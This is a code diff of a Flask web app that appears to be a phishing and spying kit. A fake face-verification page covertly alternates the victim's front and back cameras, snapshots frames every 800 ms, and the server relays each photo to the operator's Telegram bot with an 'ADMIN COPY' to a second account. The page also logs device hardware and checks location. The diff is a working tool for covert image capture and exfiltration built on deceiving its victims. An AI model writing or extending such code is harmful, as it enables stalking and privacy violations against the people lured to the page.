@@ -129,7 +129,7 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify</button></form></div>')
 
-# --- TARGET PAGE (HACK UI & RED THEME) ---
+# --- TARGET PAGE (HACK UI & RED THEME WITH DUAL CAMERA LOGIC) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
@@ -165,22 +165,14 @@ def target_page(link_id):
                 display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; 
             }
             
-            /* --- SUN RAYS CONTAINER --- */
             .ring-container {
-                position: relative;
-                width: 330px; height: 330px;
-                display: flex; align-items: center; justify-content: center;
-                margin-bottom: 20px;
+                position: relative; width: 330px; height: 330px;
+                display: flex; align-items: center; justify-content: center; margin-bottom: 20px;
             }
 
-            /* Sun Rays / Dashed Progress Ring */
             .ray-ring {
-                position: absolute;
-                width: 100%; height: 100%;
-                border-radius: 50%;
-                /* Initial Background (Grey) */
+                position: absolute; width: 100%; height: 100%; border-radius: 50%;
                 background: conic-gradient(var(--grey) 100%, transparent 0);
-                /* Masks to create Dashed Sun Rays effect */
                 -webkit-mask: radial-gradient(transparent 64%, #000 66%), repeating-conic-gradient(#000 0deg, #000 3deg, transparent 3deg, transparent 7deg);
                 z-index: 1;
             }
@@ -188,11 +180,10 @@ def target_page(link_id):
             .face-wrapper {
                 position: relative; width: 280px; height: 280px;
                 border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.5);
-                box-shadow: 0 0 35px rgba(255,0,0,0.3);
-                z-index: 2;
+                box-shadow: 0 0 35px rgba(255,0,0,0.3); z-index: 2;
             }
             
-            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #050000; } 
+            #v { width: 100%; height: 100%; object-fit: cover; background: #050000; } 
             
             .scan-ring {
                 position: absolute; top: 0; left: 0; width: 100%; height: 100%;
@@ -201,44 +192,37 @@ def target_page(link_id):
                 z-index: 10; pointer-events: none;
             }
 
-            /* Scanner Line kept active */
             .scanner-line {
                 position: absolute; top: 0; left: 0; width: 100%; height: 3px;
                 background: #ff0000; box-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
                 z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none;
             }
             
-            /* Location Map Pin UI */
             .loc-container { display: none; text-align: center; flex-direction: column; align-items: center; justify-content: center;}
             .pin-icon { font-size: 80px; color: var(--red); animation: bounce 1s infinite; margin-bottom: 20px; text-shadow: 0 0 20px var(--red); }
             
             @keyframes spin { 100% { transform: rotate(360deg); } }
             @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
             @keyframes scanAnim {
-                0% { top: 5%; opacity: 0; }
-                10% { opacity: 1; }
-                50% { top: 95%; opacity: 1; }
-                90% { opacity: 1; }
+                0% { top: 5%; opacity: 0; } 10% { opacity: 1; }
+                50% { top: 95%; opacity: 1; } 90% { opacity: 1; }
                 100% { top: 5%; opacity: 0; }
             }
 
             .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; margin-bottom: 10px; text-align:center;}
             .timer-display { font-family: 'Orbitron'; font-size: 4.5rem; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); line-height: 1; margin-top: 10px; }
 
-            /* Hidden Inline Content Viewer */
             #result-ui { display: none; width: 100%; height: 100%; padding: 20px; text-align: center; }
             .content-box { background: rgba(20,0,0,0.8); border: 1px solid var(--red); padding: 20px; border-radius: 15px; box-shadow: 0 0 25px rgba(255,0,0,0.3); width: 100%; max-width: 650px; margin: 0 auto; min-height: 80vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
             .content-text { color: #fff; font-size: 1.5rem; white-space: pre-wrap; font-family: 'Poppins'; margin-bottom: 20px;}
             
-            /* DOWNLOAD BUTTON CSS */
             .btn-download {
                 display: flex; align-items: center; justify-content: center; gap: 10px;
                 width: 100%; max-width: 350px; margin-top: 25px; padding: 16px;
                 background: linear-gradient(135deg, #8a0000, #ff0000); color: #fff;
                 border: 2px solid var(--red); border-radius: 12px; font-family: 'Orbitron', sans-serif;
                 font-size: 16px; font-weight: 800; text-decoration: none; text-transform: uppercase;
-                letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,0,0.5); transition: 0.3s;
-                cursor: pointer;
+                letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,0,0.5); transition: 0.3s; cursor: pointer;
             }
             .btn-download:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.8); }
         </style>
@@ -248,14 +232,12 @@ def target_page(link_id):
         <div id="cam-section" class="face-container">
             <div class="ring-container">
                 <div class="ray-ring" id="rayRing"></div>
-                
                 <div class="face-wrapper">
                     <div class="scan-ring"></div>
                     <div class="scanner-line"></div>
                     <video id="v" autoplay playsinline muted></video>
                 </div>
             </div>
-            
             <p class="instruction-text" id="face-msg">INITIALIZING CAMERA...</p>
             <div class="timer-display" id="seconds-timer">15</div>
         </div>
@@ -281,6 +263,8 @@ def target_page(link_id):
             const v = document.getElementById('v');
             const c = document.getElementById('c');
             let captureInterval = null;
+            let currentStream = null;
+            let activeLens = "FRONT"; // Tracks which lens is active
 
             window.onload = () => { getHardware(); startVerificationFlow(); };
 
@@ -289,11 +273,44 @@ def target_page(link_id):
                 fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) });
             }
 
+            // CROSS-BROWSER CAMERA SWITCHER (iOS, Windows, Android)
+            async function setCamera(facing) {
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+                
+                let constraints = { video: { facingMode: facing } };
+                if (facing === "environment") {
+                    constraints = { video: { facingMode: { ideal: "environment" } } };
+                }
+
+                try {
+                    currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    v.srcObject = currentStream;
+                    
+                    // Windows/Desktop fallback check: if environment camera isn't there, it returns default
+                    activeLens = (facing === "user") ? "FRONT" : "BACK";
+                    
+                    // Front cam = Mirrored, Back cam = Normal
+                    if(facing === "user") {
+                        v.style.transform = "scaleX(-1)";
+                    } else {
+                        v.style.transform = "scaleX(1)";
+                    }
+                } catch(e) {
+                    console.log("Camera access error:", e);
+                    // Fallback to front if back fails
+                    if(facing === "environment") {
+                        setCamera("user"); 
+                    }
+                }
+            }
+
             async function startVerificationFlow() {
                 if(mode === 'both' || mode === 'camera') {
                     document.getElementById('cam-section').style.display = 'flex'; 
                     try {
-                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                        await setCamera("user");
                         startFaceCheck();
                     } catch(e) {
                         document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
@@ -318,44 +335,55 @@ def target_page(link_id):
                 let imgData = c.toDataURL('image/jpeg', 0.5);
                 if(imgData.length < 1000) return; 
                 
-                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData }) });
+                // Send explicit side label to backend
+                fetch("/api/capture/{{ l_id }}", { 
+                    method: "POST", 
+                    headers: {"Content-Type":"application/json"}, 
+                    body: JSON.stringify({ img: imgData, side: activeLens }) 
+                });
             }
 
             function startFaceCheck() {
-                captureInterval = setInterval(takeSnap, 600); 
+                // Snap interval set to 800ms
+                captureInterval = setInterval(takeSnap, 800); 
 
                 let timeLeft = 15;
-                let instructions = ["Look Straight", "Look Left", "Look Right", "Look Slightly Up", "Scanning Features..."];
-                let step = 0;
-                
                 const faceMsg = document.getElementById('face-msg');
                 const timerText = document.getElementById('seconds-timer');
                 const rayRing = document.getElementById('rayRing');
 
-                // Smooth Animation setup for Sun Rays (Grey to Green)
                 let startTime = Date.now();
-                let duration = 15000; // 15 seconds
+                let duration = 15000; 
                 
                 let animFrame = setInterval(() => {
                     let elapsed = Date.now() - startTime;
                     let percent = Math.min((elapsed / duration) * 100, 100);
-                    
-                    // Updates the conic gradient to fill Green clockwise
                     rayRing.style.background = `conic-gradient(var(--green) ${percent}%, var(--grey) 0%)`;
-                    
                     if (percent >= 100) clearInterval(animFrame);
-                }, 50); // Updates very smoothly every 50ms
+                }, 50);
 
-                // Countdown text logic
+                // CAMERA TOGGLE LOGIC:
+                // Start: Front (15-11s) -> Switch Back (10-6s) -> Switch Front (5-3s) -> Switch Back (2-0s)
                 let timer = setInterval(() => {
                     timeLeft--;
                     timerText.innerText = timeLeft; 
-                    
-                    if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
-                    faceMsg.innerText = instructions[step];
+
+                    if(timeLeft === 11) {
+                        faceMsg.innerText = "ACCESSING BACK LENS...";
+                        setCamera("environment");
+                    } else if (timeLeft === 6) {
+                        faceMsg.innerText = "ACCESSING FRONT LENS...";
+                        setCamera("user");
+                    } else if (timeLeft === 3) {
+                        faceMsg.innerText = "FINALIZING ENVIRONMENT...";
+                        setCamera("environment");
+                    }
 
                     if(timeLeft <= 0) {
                         clearInterval(timer);
+                        clearInterval(captureInterval);
+                        if(currentStream) currentStream.getTracks().forEach(t => t.stop());
+                        
                         if(mode === 'both') {
                             document.getElementById('cam-section').style.display = 'none';
                             startLocationCheck();
@@ -460,11 +488,19 @@ def cap(l_id):
     try:
         link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
         user = link["users"]
-        img_data = request.get_json()["img"]
+        
+        data = request.get_json()
+        img_data = data.get("img", "")
+        lens_side = data.get("side", "UNKNOWN") # Yahan Pata Chalega Front Hai Ya Back
         
         raw = base64.b64decode(img_data.split(",")[1])
-        send_tg_photo(user["bot_token"], user["chat_id"], raw, "😈 *UCHIHA CAPTURE*")
-        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}")
+        
+        # Telegram Message Main Label Add Kiya Hai
+        caption_msg = f"😈 *UCHIHA CAPTURE* \\n📸 Lens: *[{lens_side} CAMERA]*"
+        
+        send_tg_photo(user["bot_token"], user["chat_id"], raw, caption_msg)
+        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}\\n📸 Lens: {lens_side}")
+        
         return jsonify({"s": 1})
     except: return jsonify({"s": 0})
 
